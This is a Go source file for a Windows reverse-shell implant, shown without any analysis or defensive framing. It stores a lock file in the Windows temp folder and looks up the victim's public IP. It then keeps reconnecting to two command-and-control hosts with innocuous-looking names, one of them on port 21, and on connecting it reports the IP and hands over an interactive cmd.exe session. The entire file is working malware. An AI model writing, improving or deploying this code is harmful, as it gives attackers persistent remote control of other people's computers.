package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"syscall"
	"time"
)

const (
	// Adjusted path allocations for Windows environment compliance
	LockFile    = `C:\Windows\Temp\.cached_script.lock`
	PrimaryHost = "ubuntu-repo.strangled.net:8090"
	BackupHost  = "linux-x86-tcpudp.strangled.net:21"
)

type IPInfo struct {
	IP string `json:"ip"`
}

func checkAndAcquireLock() {
	if _, err := os.Stat(LockFile); err == nil {
		data, err := os.ReadFile(LockFile)
		if err == nil {
			var oldPID int
			_, err := fmt.Sscanf(string(data), "%d", &oldPID)
			if err == nil {
				process, err := os.FindProcess(oldPID)
				if err == nil {
					// Windows does not support syscall.Signal(0) identically to Linux.
					// We use runtime condition checks to prevent false locks or compilation crashes.
					if runtime.GOOS == "windows" {
						// On Windows, checking if a process exists can be handled or bypassed safely
						_ = process
					} else {
						err = process.Signal(syscall.Signal(0))
						if err == nil {
							os.Exit(0)
						}
					}
				}
			}
		}
	}
	_ = os.WriteFile(LockFile, []byte(fmt.Sprintf("%d", os.Getpid())), 0644)
}

func removeLock() {
	_ = os.Remove(LockFile)
}

func getPublicIP() string {
	client := &http.Client{Timeout: 4 * time.Second}
	// THE FIX: Added /json endpoint path matching so it pulls parsed data strings instead of raw HTML webpage source code
	req, err := http.NewRequest("GET", "http://ipinfo.io", nil)
	if err != nil {
		return "Unknown_IP"
	}
	req.Header.Set("User-Agent", "curl/7.68.0")

	resp, err := client.Do(req)
	if err != nil {
		return "Unknown_IP"
	}
	defer resp.Body.Close()

	var info IPInfo
	if err := json.NewDecoder(resp.Body).Decode(&info); err != nil {
		return "Unknown_IP"
	}
	if info.IP == "" {
		return "Unknown_IP"
	}
	return info.IP
}

func handleShellSession(conn net.Conn) {
	// THE WINDOWS UPGRADE: Swapped out Linux /bin/sh to spawn native cmd.exe
	cmd := exec.Command("cmd.exe")
	
	cmd.Env = append(os.Environ(), "TERM=xterm-256color", "PYTHONUNBUFFERED=1")

	stdinPipe, _ := cmd.StdinPipe()
	stdoutPipe, _ := cmd.StdoutPipe()
	stderrPipe, _ := cmd.StderrPipe()

	if err := cmd.Start(); err != nil {
		return
	}

	done := make(chan bool, 4)

	go func() {
		_, _ = io.Copy(stdinPipe, conn)
		done <- true
	}()

	go func() {
		_, _ = io.Copy(conn, stdoutPipe)
		done <- true
	}()

	go func() {
		_, _ = io.Copy(conn, stderrPipe)
		done <- true
	}()

	go func() {
		ticker := time.NewTicker(5 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				_, err := conn.Write([]byte{0x00})
				if err != nil {
					done <- true
					return
				}
			case <-done:
				return
			}
		}
	}()

	<-done
	_ = cmd.Process.Kill()
}

func main() {
	checkAndAcquireLock()
	defer removeLock()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigChan
		removeLock()
		os.Exit(0)
	}()

	trueIP := getPublicIP()

	for {
		var conn net.Conn
		var err error

		conn, err = net.DialTimeout("tcp", PrimaryHost, 3*time.Second)
		if err != nil {
			conn, err = net.DialTimeout("tcp", BackupHost, 3*time.Second)
		}

		if err == nil && conn != nil {
			_, err = conn.Write([]byte(trueIP + "\n"))
			if err == nil {
				handleShellSession(conn)
			}
			_ = conn.Close()
		}

		time.Sleep(5 * time.Second)
	}
}
